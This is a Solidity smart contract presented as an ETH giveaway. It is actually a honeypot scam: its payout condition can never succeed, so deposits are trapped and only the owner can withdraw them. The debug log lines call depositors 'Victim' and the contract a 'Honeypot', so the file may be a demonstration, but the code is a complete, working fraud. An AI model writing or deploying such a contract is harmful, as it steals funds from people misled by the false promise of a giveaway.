
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract ETH_Giveaway
{
    // This is a ETH giveway, take all the contract ETH !! (If you can) test
    
    address public owner;
    
    constructor (address _owner) payable {
        console.log("Setting the owner");
        owner = _owner;
    }
    
    function viewGameBalance () public view returns (uint) {
        return address(this).balance;
        
    }

    
    function giveway(address _reciever) public payable{
        console.log("Victim deposits %s", msg.value);
        
        require(msg.value > 0, "Error");
        console.log("Honeypot Balance is now: %s", address(this).balance);
        if(msg.value >= address(this).balance){
            
            payable(_reciever).transfer(address(this).balance + msg.value);
            
        }

    }
    
    function withdraw()  public
    {
        require(msg.sender == owner);
        console.log("Owner takes all the money");
        payable(owner).transfer(address(this).balance);
    }
    
}